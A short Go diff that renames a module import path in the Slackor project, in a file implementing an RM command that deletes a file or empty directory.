@@ -4,7 +4,7 @@ import (
 	"errors"
 	"os"
 
-	"github.com/Coalfire-Research/Slackor/pkg/command"
+	"github.com/n00py/Slackor/pkg/command"
 )
 
 // RM removes the given file or empty directory
